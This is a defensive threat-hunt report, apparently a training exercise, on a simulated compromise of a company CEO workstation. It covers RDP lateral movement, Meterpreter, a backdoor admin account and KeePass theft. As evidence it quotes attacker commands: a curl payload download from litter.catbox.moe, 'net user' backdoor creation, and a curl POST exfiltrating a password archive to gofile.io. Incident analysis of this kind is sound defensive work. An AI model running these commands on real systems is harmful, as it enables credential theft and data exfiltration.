## Threat Hunt Report
**Bridge Takeover – Executive Endpoint Compromise**

<img width="427" height="322" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/overview/Bridge%20Takeover.png" />

**Azuki Import/Export**

**Executive Summary**

Five days after the initial file server breach, threat actors re-entered the environment using previously established access. The attacker laterally moved from a compromised workstation to the CEO’s administrative workstation, leveraging RDP and valid credentials. Once established, the attacker deployed a Meterpreter backdoor, escalated privileges, enumerated sensitive credential stores, and staged high-value business data. The incident culminated in the exfiltration of financial documents and password databases to multiple anonymous file-hosting services.

| Category                | Details                                               |
| ----------------------- | ----------------------------------------------------- |
| **Incident Type**       | Lateral Movement, Credential Theft, Data Exfiltration |
| **Initial Detection**   | Nov 24, 2025                                          |
| **Threat Actor Access** | RemoteInteractive (RDP)                               |
| **Security Platform**   | Microsoft Defender for Endpoint                       |
| **Confidence Level**    | High                                                  |

| Attribute                        | Value                               |
| -------------------------------- | ----------------------------------- |
| **Source IP (Lateral Movement)** | `10.1.0.204`                        |
| **Exfiltration Infrastructure**  | `litter.catbox.moe`, `gofile.io`    |
| **Tooling Observed**             | curl, 7zip, Meterpreter, PowerShell |
| **Framework Indicators**         | Metasploit                          |

| Asset Type               | Identifier                    |
| ------------------------ | ----------------------------- |
| **Workstation (Pivot)**  | `azuki-sl`                    |
| **File Server**          | `azuki-fileserver01`          |
| **CEO Admin PC**         | `azuki-adminpc`               |
| **Compromised Accounts** | `yuki.tanaka`, `yuki.tanaka2` |

| Tactic               | Technique                       | ID           |
| -------------------- | ------------------------------- | ------------ |
| Initial Access       | Valid Accounts                  | T1078        |
| Lateral Movement     | Remote Services (RDP)           | T1021.001    |
| Execution            | Command & Scripting Interpreter | T1059        |
| Persistence          | Registry Run Keys               | T1547.001    |
| Privilege Escalation | Account Manipulation            | T1098        |
| Credential Access    | OS Credential Dumping           | T1003        |
| Discovery            | Account & Network Discovery     | T1087, T1046 |
| Collection           | Archive Collected Data          | T1560        |
| Exfiltration         | Exfiltration Over Web Services  | T1567        |

**Investigation Timeline (Key Events)**
**Lateral Movement**

**2025-11-24 14:17 UTC**
Successful RDP login to azuki-adminpc

Account: yuki.tanaka

Source IP: 10.1.0.204

<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/lateral-movement/Lateral_movement_azuki-adminpc1.png" />

**Malware Staging**

**2025-11-25 04:06 UTC**
Malware downloaded via anonymous file host:

```
curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/External_archive_download.png" />

**Payload Extraction**

**2025-11-25 04:21 UTC**

```
7z.exe x KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache -y
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Extraction_of_password_protected_archive.png" />

* Meterpreter payload deployed

**Command & Control**

* **Named Pipe Identified**
```
\Device\NamedPipe\msf-pipe-5902
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Named_pipe_msf.png" />

* Confirms Metasploit usage

**Privilege Escalation**

* **Backdoor Account Created**
```
net user yuki.tanaka2 B@ckd00r2024! /add
net localgroup Administrators yuki.tanaka2 /add
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Privilege_escalation_administrators_group1.png" />

**Cyber Chef decoded base64 commands**
* New account added

  <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Base64_decoded_privilege_escalation_command.png" />
  
* Account added to the administrators group (privilege escalation)
  
 <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Cyber_Chef_decoded_command.png" /> 

**Credential & Data Discovery**

KeePass enumeration:
```
cmd.exe /c where /r C:\Users *.kdbx
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Credential_enumeration_kdbx.png" />

* Sensitive files accessed:

  * OLD-Password.txt
    
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/OLD_Password_text.png" />

  * Banking records

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Banking_documents_copied.png" />

**Data Staging**

* Staging directory:
  
 ``` 
C:\ProgramData\Microsoft\Crypto\staging
```

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/staging/Staging_directory_path.png" />

* Data copied:

```
robocopy Documents\Banking staging\Banking /E
```


**Compression & Exfiltration**

Archive created:

```
tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt
```

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/Master_password_extracted.png" />

* Exfiltration:

```
curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/exfiltration/gofile-exfill.png" />

* **Destination IP**: 45.112.123.227

**Impact Assessment**
**Actual Impact**

* Theft of password databases

* Exposure of banking & financial records

* Persistent administrative backdoor

* CEO workstation fully compromised

**Risk Level**

**CRITICAL**

**Key Indicators of Compromise (IOCs)**
**File Artifacts**

* `meterpreter.exe`

* `KB5044273-x64.7z`

* `credentials.tar.gz`

* `KeePass-Master-Password.txt`

* **Network**

* `litter.catbox.moe`

* `store1.gofile.io`

* `45.112.123.227`

**Registry**
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

**Recommendations**
**Immediate**

* Disable compromised accounts

* Isolate affected hosts

* Rotate all privileged credentials

* Block exfiltration domains

* Remove persistence mechanisms

**Long-Term**

* Enforce MFA on all RDP access

* Disable PowerShell encoded commands

* Implement EDR tamper protection

* Network segmentation for admin assets

* Continuous threat hunting cadence

**Appendix**

* All findings derived from Microsoft Defender for Endpoint telemetry

* Queries written in KQL

* Analysis performed using adversary emulation mindset
